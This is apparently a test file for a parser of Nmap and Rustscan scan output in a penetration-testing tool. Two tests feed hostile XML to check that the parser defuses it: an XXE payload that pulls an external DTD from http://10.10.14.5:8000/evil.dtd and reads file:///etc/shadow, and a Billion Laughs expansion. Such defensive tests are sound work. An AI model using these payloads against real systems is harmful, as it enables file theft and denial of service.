import { describe, it, expect } from 'vitest';
import {
  getServiceIntelligence,
  parseNmapXml,
  parseRustscan,
  detectAndParseScan,
} from './scanParserUtils';

describe('scanParserUtils', () => {
  describe('getServiceIntelligence', () => {
    it('returns FTP tools and detects vsftpd 2.3.4 backdoor CVE', () => {
      const result = getServiceIntelligence(21, 'ftp', 'vsftpd 2.3.4');
      expect(result.tools).toContain('ftp');
      expect(result.tools).toContain('hydra');
      expect(result.cve).toContain('CVE-2011-2523');
    });

    it('returns SMB tools and detects Samba 3.0.20 RCE', () => {
      const result = getServiceIntelligence(445, 'microsoft-ds', 'Samba 3.0.20');
      expect(result.tools.some((t) => t.includes('smb'))).toBe(true);
      expect(result.cve).toContain('CVE-2007-2447');
    });

    it('returns web enumeration tools for HTTP ports', () => {
      const result = getServiceIntelligence(80, 'http', 'Apache 2.4.49');
      expect(result.tools).toContain('ffuf');
      expect(result.tools).toContain('gobuster');
      expect(result.cve).toContain('CVE-2021-41773');
    });

    it('returns generic fallback tools for unmapped services', () => {
      const result = getServiceIntelligence(9999, 'custom-service', 'v1.0');
      expect(result.tools).toContain('nc -nv');
      expect(result.tools).toContain('nmap -sC -sV');
    });
  });

  describe('parseNmapXml', () => {
    it('parses valid Nmap XML output extracting host IP and open ports', () => {
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap" args="nmap -sC -sV 10.10.10.100" version="7.94">
  <host>
    <status state="up"/>
    <address addr="10.10.10.100" addrtype="ipv4"/>
    <hostnames><hostname name="target.box" type="user"/></hostnames>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open"/>
        <service name="ssh" product="OpenSSH" version="8.2p1"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="open"/>
        <service name="http" product="nginx" version="1.18.0"/>
      </port>
      <port protocol="tcp" portid="3306">
        <state state="closed"/>
        <service name="mysql"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const result = parseNmapXml(xml);
      expect(result).not.toBeNull();
      expect(result?.format).toBe('nmap-xml');
      expect(result?.detectedIp).toBe('10.10.10.100');
      expect(result?.detectedHost).toBe('target.box');
      expect(result?.ports).toHaveLength(2);
      expect(result?.ports[0].port).toBe(22);
      expect(result?.ports[1].port).toBe(80);
    });

    it('returns null for malformed or non-nmap XML', () => {
      expect(parseNmapXml('not xml at all')).toBeNull();
      expect(parseNmapXml('<root><broken></root>')).toBeNull();
      expect(parseNmapXml('<otherXml></otherXml>')).toBeNull();
    });

    it('neutralizes nested DTD internal subsets and XXE entity definitions without executing or failing', () => {
      const xxeXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun [
  <!ENTITY % remote SYSTEM "http://10.10.14.5:8000/evil.dtd">
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
  <!ENTITY % param1 "<!ENTITY internal 'injected'>">
  %remote;
  %param1;
]>
<nmaprun scanner="nmap" args="nmap -sV 10.10.10.50" version="7.94">
  <host>
    <status state="up"/>
    <address addr="10.10.10.50" addrtype="ipv4"/>
    <hostnames><hostname name="hardened.target" type="user"/></hostnames>
    <ports>
      <port protocol="tcp" portid="443">
        <state state="open"/>
        <service name="https" product="Apache" version="2.4.52"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const result = parseNmapXml(xxeXml);
      expect(result).not.toBeNull();
      expect(result?.format).toBe('nmap-xml');
      expect(result?.detectedIp).toBe('10.10.10.50');
      expect(result?.detectedHost).toBe('hardened.target');
      expect(result?.ports).toHaveLength(1);
      expect(result?.ports[0].port).toBe(443);
    });

    it('strips multi-line ENTITY declarations and handles Billion Laughs expansion payloads safely', () => {
      const billionLaughsXml = `<?xml version="1.0"?>
<!DOCTYPE nmaprun [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<nmaprun scanner="nmap" args="nmap 192.168.1.254" version="7.94">
  <host>
    <address addr="192.168.1.254" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open"/>
        <service name="ssh"/>
      </port>
    </ports>
  </host>
</nmaprun>`;

      const result = parseNmapXml(billionLaughsXml);
      expect(result).not.toBeNull();
      expect(result?.detectedIp).toBe('192.168.1.254');
      expect(result?.ports[0].port).toBe(22);
    });
  });

  describe('parseRustscan', () => {
    it('parses Rustscan output format with Open IP:PORT lines', () => {
      const rustscanOutput = `
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  \\| |
| .-. \\| {_} |.-}_} } | |  .-}_} }\\     }/  /\\  \\|   | |
\`-' \`-' \`-----'\`----'  \`-'  \`----'  \`---' \`-'  \`-'\`-' \`-'
Open 10.10.10.175:22
Open 10.10.10.175:80
Open 10.10.10.175:8080
[~] Starting Script(s)
      `;

      const result = parseRustscan(rustscanOutput);
      expect(result).not.toBeNull();
      expect(result?.format).toBe('rustscan');
      expect(result?.detectedIp).toBe('10.10.10.175');
      expect(result?.ports.map((p) => p.port)).toEqual([22, 80, 8080]);
    });
  });

  describe('detectAndParseScan', () => {
    it('automatically identifies XML format', () => {
      const xml = `<nmaprun><host><address addr="192.168.1.1" addrtype="ipv4"/><ports><port protocol="tcp" portid="443"><state state="open"/></port></ports></host></nmaprun>`;
      const res = detectAndParseScan(xml);
      expect(res).not.toBeNull();
      expect(res?.format).toBe('nmap-xml');
      expect(res?.detectedIp).toBe('192.168.1.1');
    });

    it('parses multi-host XML scans detecting all hosts and returning primary target', () => {
      const multiHostXml = `<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" version="7.94">
  <host>
    <address addr="10.10.10.161" addrtype="ipv4"/>
    <hostnames><hostname name="dc01.forest.local"/></hostnames>
    <ports>
      <port protocol="tcp" portid="88"><state state="open"/><service name="kerberos-sec"/></port>
      <port protocol="tcp" portid="389"><state state="open"/><service name="ldap"/></port>
    </ports>
  </host>
  <host>
    <address addr="10.10.10.162" addrtype="ipv4"/>
    <hostnames><hostname name="ws01.forest.local"/></hostnames>
    <ports>
      <port protocol="tcp" portid="445"><state state="open"/><service name="microsoft-ds"/></port>
    </ports>
  </host>
</nmaprun>`;
      const res = parseNmapXml(multiHostXml);
      expect(res).not.toBeNull();
      expect(res?.format).toBe('nmap-xml');
      expect(res?.hosts).toHaveLength(2);
      expect(res?.hosts?.[0].ip).toBe('10.10.10.161');
      expect(res?.hosts?.[1].ip).toBe('10.10.10.162');
      expect(res?.warnings?.[0]).toContain('Multi-host scan: 2 hosts detected');
    });

    it('parses IPv6 addresses in Nmap XML', () => {
      const ipv6Xml = `<?xml version="1.0"?>
<nmaprun><host><address addr="dead:beef::1" addrtype="ipv6"/><ports><port protocol="tcp" portid="22"><state state="open"/></port></ports></host></nmaprun>`;
      const res = parseNmapXml(ipv6Xml);
      expect(res).not.toBeNull();
      expect(res?.detectedIp).toBe('dead:beef::1');
    });

    it('identifies raw port list fallback', () => {
      const raw = '80, 443, 8080';
      const res = detectAndParseScan(raw);
      expect(res).not.toBeNull();
      expect(res?.ports.map((p) => p.port)).toEqual([80, 443, 8080]);
    });

    it('neutralizes CVE tokens from raw text so CVE-2021-41773 does not leak fake ports', () => {
      const cveText = 'Found vulnerability CVE-2021-41773 on Apache and CVE-2017-0144 on SMB';
      const res = detectAndParseScan(cveText);
      // Because there are no explicit port markers and only hyphenated CVE tokens, no false-positive ports should be extracted
      expect(res).toBeNull();
    });

    it('parses IPv6 addresses and captures NSE script outputs in standard Nmap text mode', () => {
      const nmapText = `
Nmap scan report for ipv6.target.lab (fe80::1ff:fe23:4567:890a)
Host is up (0.0020s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
|_  211-Features
80/tcp open  http    Apache httpd 2.4.49
`;
      const res = detectAndParseScan(nmapText);
      expect(res).not.toBeNull();
      expect(res?.format).toBe('nmap-text');
      expect(res?.detectedIp).toBe('fe80::1ff:fe23:4567:890a');
      expect(res?.detectedHost).toBe('ipv6.target.lab');
      expect(res?.ports).toHaveLength(2);
      expect(res?.ports[0].port).toBe(21);
      expect(res?.ports[0].scripts?.['ftp-anon']).toContain('Anonymous FTP login allowed');
      expect(res?.ports[0].cveNotes).toContain('CVE-2011-2523');
      expect(res?.ports[1].port).toBe(80);
      expect(res?.ports[1].cveNotes).toContain('CVE-2021-41773');
    });
  });

  describe('headerless nmap port lines (ex-nmapParser coverage)', () => {
    const openPorts = (text: string) => detectAndParseScan(text)?.ports.map((p) => p.port) ?? [];

    it('parses standard nmap output with open ports and services', () => {
      const raw = `
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.150
Host is up (0.045s latency).
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 4.6.2
Nmap done: 1 IP address scanned in 8.35 seconds
`;
      const res = detectAndParseScan(raw);
      expect(res?.format).toBe('nmap-text');
      expect(res?.ports.map((p) => p.port)).toEqual([22, 80, 445]);
      expect(res?.ports[0]).toMatchObject({ protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.5' });
    });

    it('parses bare UDP and TCP port lines that have no PORT/STATE header', () => {
      const res = detectAndParseScan('53/udp   open  domain  ISC BIND 9.16.1\n161/udp  open  snmp    SNMPv3 server\n');
      expect(res?.ports.map((p) => p.port)).toEqual([53, 161]);
      expect(res?.ports.every((p) => p.protocol === 'udp')).toBe(true);
      expect(res?.ports[0].service).toBe('domain');
    });

    it('keeps open and open|filtered ports but drops closed and filtered ones', () => {
      const raw = `
21/tcp   closed   ftp
22/tcp   open     ssh
23/tcp   filtered telnet
80/tcp   open|filtered http
443/tcp  open     https
`;
      expect(openPorts(raw)).toEqual([22, 80, 443]);
      expect(detectAndParseScan(raw)?.ports.find((p) => p.port === 80)?.state).toBe('open|filtered');
    });

    it('parses comma-separated port lists with keywords', () => {
      expect(openPorts('Discovered open ports: 21, 22, 80, 443 on target')).toEqual([21, 22, 80, 443]);
    });

    it('returns null for empty or portless input', () => {
      expect(detectAndParseScan('')).toBeNull();
      expect(detectAndParseScan('No ports open, host seems down.')).toBeNull();
    });
  });

  describe('multi-host intake', () => {
    it('lists every host of a multi-host nmap text report', () => {
      const text = `Nmap scan report for dc01.corp.local (10.0.0.1)
Host is up.
PORT    STATE SERVICE
88/tcp  open  kerberos-sec
389/tcp open  ldap

Nmap scan report for 10.0.0.2
Host is up.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
`;
      const res = detectAndParseScan(text);
      expect(res?.hosts).toHaveLength(2);
      expect(res?.hosts?.[0]).toMatchObject({ ip: '10.0.0.1', hostname: 'dc01.corp.local' });
      expect(res?.hosts?.[0].ports.map((p) => p.port)).toEqual([88, 389]);
      expect(res?.hosts?.[1]).toMatchObject({ ip: '10.0.0.2', os: 'Linux' });
      expect(res?.hosts?.[1].ports.map((p) => p.port)).toEqual([22]);
    });

    it('does not set hosts for a single-host text report', () => {
      expect(detectAndParseScan('Nmap scan report for 10.0.0.9\nPORT STATE SERVICE\n22/tcp open ssh\n')?.hosts).toBeUndefined();
    });

    it('groups gnmap lines by host', () => {
      const gnmap = [
        '# Nmap 7.94 scan initiated as: nmap -oG - 10.0.0.0/30',
        'Host: 10.0.0.1 (a.lab)\tStatus: Up',
        'Host: 10.0.0.1 (a.lab)\tPorts: 22/open/tcp//ssh//OpenSSH 8.2/, 80/open/tcp//http//nginx/\tIgnored State: closed (998)',
        'Host: 10.0.0.2 ()\tPorts: 445/open/tcp//microsoft-ds///',
      ].join('\n');
      const res = detectAndParseScan(gnmap);
      expect(res?.format).toBe('gnmap');
      expect(res?.hosts).toHaveLength(2);
      expect(res?.hosts?.[0]).toMatchObject({ ip: '10.0.0.1', hostname: 'a.lab' });
      expect(res?.hosts?.[0].ports.map((p) => p.port)).toEqual([22, 80]);
      expect(res?.hosts?.[1].ports.map((p) => p.port)).toEqual([445]);
    });
  });
});
